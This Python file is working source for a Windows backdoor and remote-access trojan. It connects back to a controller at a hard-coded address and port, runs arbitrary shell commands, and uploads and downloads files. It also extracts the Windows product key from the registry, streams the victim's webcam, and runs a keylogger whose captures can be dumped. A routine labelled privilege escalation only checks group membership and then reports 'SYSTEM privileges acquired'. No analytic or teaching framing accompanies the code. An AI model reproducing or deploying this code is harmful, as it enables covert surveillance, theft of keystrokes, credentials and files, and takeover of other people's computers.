import socket
import subprocess
import json
import os
import base64
import cv2
import threading
import keyboard
import winreg

# Helper functions for Windows key retrieval
def decode_key(rpk):
    rpkOffset = 52
    i = 28
    szPossibleChars = "BCDFGHJKMPQRTVWXY2346789"
    szProductKey = ""

    while i >= 0:
        dwAccumulator = 0
        j = 14
        while j >= 0:
            dwAccumulator = dwAccumulator * 256
            d = rpk[j + rpkOffset]
            if isinstance(d, str):
                d = ord(d)
            dwAccumulator = d + dwAccumulator
            rpk[j + rpkOffset] = int(dwAccumulator / 24) if int(dwAccumulator / 24) <= 255 else 255
            dwAccumulator = dwAccumulator % 24
            j = j - 1
        i = i - 1
        szProductKey = szPossibleChars[dwAccumulator] + szProductKey

        if ((29 - i) % 6) == 0 and i != -1:
            i = i - 1
            szProductKey = "-" + szProductKey
    return szProductKey

def get_windows_key():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows NT\CurrentVersion')
        value, _ = winreg.QueryValueEx(key, 'DigitalProductID')
        return decode_key(list(value))
    except:
        return "Failed to retrieve Windows key"

# Webcam streaming
def webcam_stream(send_frame):
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        # Draw a blue square on the frame
        height, width, _ = frame.shape
        start_point = (int(width / 3), int(height / 3))
        end_point = (int(2 * width / 3), int(height / 3) + 50)
        color = (255, 0, 0)  # Blue color
        thickness = 2
        cv2.rectangle(frame, start_point, end_point, color, thickness)
        _, jpeg = cv2.imencode('.jpg', frame)
        send_frame(jpeg.tobytes())
    cap.release()

# Keylogger variables
keylog = []
keylogger_active = False

class Backdoor:
    def __init__(self, ip, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((ip, port))
        self.shell_active = False

    def execute(self, command):
        try:
            return subprocess.check_output(command, shell=True, text=True)
        except subprocess.CalledProcessError:
            return "[+] Invalid command [+]"

    def send_json(self, data):
        json_data = json.dumps(data)
        self.s.send(json_data.encode())

    def receive_json(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.s.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def change_dir(self, path):
        try:
            os.chdir(path)
        except OSError:
            return "Invalid path"
        return "Changed directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful [+]"

    def escalate_privileges(self):
        if os.name == 'nt':
            try:
                subprocess.run("whoami /groups | find \"S-1-5-32-544\"", shell=True, check=True)
                return "[+] SYSTEM privileges acquired [+]"
            except:
                return "[-] Failed to escalate privileges [-]"
        else:
            return "[-] Not a Windows system [-]"

    def keylogger_start(self):
        global keylog, keylogger_active
        keylog = []
        keylogger_active = True
        def log_keys():
            while keylogger_active:
                event = keyboard.read_event()
                if event.event_type == keyboard.KEY_DOWN:
                    key = event.name
                    if key not in ["caps lock", "ctrl", "num lock", "print screen", "shift", "enter"]:
                        keylog.append(key if key != "space" else " ")
                    elif key == "enter":
                        keylog.append("[ENTER]")
        threading.Thread(target=log_keys, daemon=True).start()
        return "[+] Keylogger started [+]"

    def keylogger_dump(self):
        return "".join(keylog)

    def keylogger_stop(self):
        global keylogger_active
        keylogger_active = False
        return "[+] Keylogger stopped [+]"

    def run(self):
        while True:
            command = self.receive_json()
            try:
                if command[0] == "exit":
                    self.s.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_output = self.change_dir(command[1])
                elif command[0] == "download":
                    command_output = self.read_file(command[1])
                elif command[0] == "upload":
                    command_output = self.write_file(command[1], command[2])
                elif command[0] == "get-key":
                    command_output = get_windows_key()
                elif command[0] == "webcam_stream":
                    def send_frame(frame):
                        self.send_json({"frame": base64.b64encode(frame).decode()})
                    threading.Thread(target=webcam_stream, args=(send_frame,), daemon=True).start()
                    command_output = "[+] Webcam streaming started [+]"
                elif command[0] == "shell":
                    self.shell_active = True
                    command_output = "[+] Interactive shell started [+]"
                elif command[0] == "!getsystem" and self.shell_active:
                    command_output = self.escalate_privileges()
                elif command[0] == "keymon":
                    if command[1] == "start":
                        command_output = self.keylogger_start()
                    elif command[1] == "dump":
                        command_output = self.keylogger_dump()
                    elif command[1] == "stop":
                        command_output = self.keylogger_stop()
                else:
                    command_output = self.execute(command)
            except Exception:
                command_output = "[+] Error during execution of the command [+]"
            self.send_json(command_output)

backdoor = Backdoor("10.0.1.40", 4443)
backdoor.run()
